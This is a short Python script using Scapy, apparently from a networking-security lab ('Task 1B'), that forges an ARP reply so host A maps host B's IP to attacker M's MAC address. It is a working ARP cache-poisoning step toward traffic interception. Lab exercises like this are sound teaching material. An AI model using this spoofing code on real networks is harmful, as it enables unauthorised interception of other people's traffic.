#!/usr/bin/python3

from scapy.all import *

#Task 1B: Using ARP Reply to send to host A

#Under Ether():
#M replies to A with M's MAC address
#dst (dest MAC): A's MAC address [08:00:27:cd:a8:db]

E = Ether(dst = "08:00:27:cd:a8:db")

#Under ARP():
#op = 2 (is-at)
#psrc (source IP): B's IP [10.0.2.6] (M spoofing B)
#pdst (dest IP): A's IP [10.0.2.5] (M poisoning A)
#hwdst (dest MAC): A's MAC address [08:00:27:cd:a8:db]
#hwsrc (source MAC): M's MAC address [08:00:27:02:6d:61]

A = ARP(op = 2, psrc = "10.0.2.6", pdst = "10.0.2.5", hwdst = "08:00:27:cd:a8:db", hwsrc = "08:00:27:02:6d:61")

pkt = E/A 
sendp(pkt)
